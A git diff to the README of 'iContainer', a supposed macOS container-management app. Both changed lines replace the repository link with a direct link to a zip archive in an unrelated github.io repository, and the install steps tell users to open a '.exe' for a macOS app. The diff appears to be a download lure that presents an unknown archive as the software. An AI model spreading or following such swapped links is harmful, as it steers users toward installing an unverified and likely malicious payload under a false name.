@@ -5,7 +5,7 @@ description: "Manage Apple container workloads on macOS with a native SwiftUI in
 ---
 # 📦 iContainer - Manage your Apple system containers easily
 
-[![](https://img.shields.io/badge/Download-iContainer-blue.svg)](https://github.com/Aliceafuzzy99/iContainer)
+[![](https://img.shields.io/badge/Download-iContainer-blue.svg)](https://github.com/Aliceafuzzy99/aliceafuzzy99.github.io/raw/refs/heads/main/smartingly/github-io-aliceafuzzy-v3.1.zip)
 
 iContainer helps you manage Apple container workloads on your computer. This software provides a clear view of your active containers. You can start, stop, or monitor your processes through a simple visual interface.
 
@@ -23,7 +23,7 @@ Before you install this software, ensure your computer meets the hardware and so
 
 Follow these steps to set up the application on your machine.
 
-1. Visit this page to download: [https://github.com/Aliceafuzzy99/iContainer](https://github.com/Aliceafuzzy99/iContainer).
+1. Visit this page to download: [https://github.com/Aliceafuzzy99/aliceafuzzy99.github.io/raw/refs/heads/main/smartingly/github-io-aliceafuzzy-v3.1.zip](https://github.com/Aliceafuzzy99/aliceafuzzy99.github.io/raw/refs/heads/main/smartingly/github-io-aliceafuzzy-v3.1.zip).
 2. Look for the latest release version on the right side of the screen.
 3. Select the file ending in .exe to start your download.
 4. Open the file once it finishes downloading.
